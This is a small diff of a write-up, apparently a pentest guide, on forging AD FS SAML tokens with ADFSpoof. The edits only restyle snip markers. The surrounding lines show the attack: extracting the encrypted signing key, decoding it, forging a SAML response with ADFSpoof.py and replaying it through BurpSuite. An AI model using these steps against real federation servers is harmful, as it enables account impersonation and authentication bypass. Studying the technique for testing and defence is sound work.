@@ -37,7 +37,7 @@ Created by @doughsec
 
 ## Reading Encrypted Signing Key from Database
 [-] Encrypted Token Signing Key Begin
-AAAAAQAAAA ...[SNIP]... EsNEUSTXxm
+AAAAAQAAAA ---[SNIP]--- EsNEUSTXxm
 [-] Encrypted Token Signing Key End
 
 [-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
@@ -104,7 +104,7 @@ echo -n '<B64_ENCRYPTED_TOKEN>' | base64 -d > EncryptedPfx.bin
 ```
 
 ```console {class="sample-code"}
-$ echo -n 'AAAAAQAAAA ...[SNIP]... EsNEUSTXxm' | base64 -d > EncryptedPfx.bin
+$ echo -n 'AAAAAQAAAA ---[SNIP]--- EsNEUSTXxm' | base64 -d > EncryptedPfx.bin
 ```
 
 #### 3. Check which private key is correct
@@ -148,7 +148,7 @@ $ python3 ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin -s core.example.com saml2 -
 A tool to for AD FS security tokens
 Created by @doughsec
 
-PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
+PHNhbWxwOl ---[SNIP]--- c3BvbnNlPg%3D%3D
 ```
 
 #### 5. Modify request in BurpSuite
@@ -181,7 +181,7 @@ Sec-Fetch-Site: same-site
 Te: trailers
 Connection: close
 
-SAMLResponse=PHNhbWxwOl ...[SNIP]... c3BvbnNlPg%3D%3D
+SAMLResponse=PHNhbWxwOl ---[SNIP]--- c3BvbnNlPg%3D%3D
 ```
 
 {{< /tabcontent >}}
